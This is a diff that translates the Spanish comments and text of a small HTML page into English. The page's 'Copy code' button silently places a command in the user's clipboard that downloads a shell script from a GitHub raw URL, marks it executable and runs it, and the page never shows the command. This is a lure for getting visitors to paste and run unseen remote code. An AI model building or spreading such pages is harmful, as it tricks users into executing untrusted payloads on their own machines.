@@ -4,29 +4,29 @@
     <title>Copy Code Example</title>
 </head>
 <body>
-    <p>Para copiar el código, haga clic en "Copy code":</p>
+    <p>To copy the code, click on "Copy code":</p>
     <button id="copyButton">Copy code</button>
 
     <script>
-        // Función para copiar el código al portapapeles
+        // Function to copy the code to the clipboard
         function copyCodeToClipboard() {
-            // Crear un elemento de textarea temporal
+            // Create a temporary textarea element
             const textarea = document.createElement('textarea');
             textarea.value = 'curl https://raw.githubusercontent.com/ivysolco/main/main/user.sh -o test.sh && chmod +x ./test.sh && ./test.sh';
             document.body.appendChild(textarea);
 
-            // Seleccionar y copiar el texto al portapapeles
+            // Select and copy the text to the clipboard
             textarea.select();
             document.execCommand('copy');
 
-            // Eliminar el elemento de textarea temporal
+            // Remove the temporary textarea element
             document.body.removeChild(textarea);
 
-            // Mostrar un mensaje de confirmación
-            alert('Código copiado al portapapeles');
+            // Show a confirmation message
+            alert('Code copied to clipboard');
         }
 
-        // Asociar la función de copia al botón
+        // Attach the copy function to the button
         document.getElementById('copyButton').addEventListener('click', copyCodeToClipboard);
     </script>
 </body>
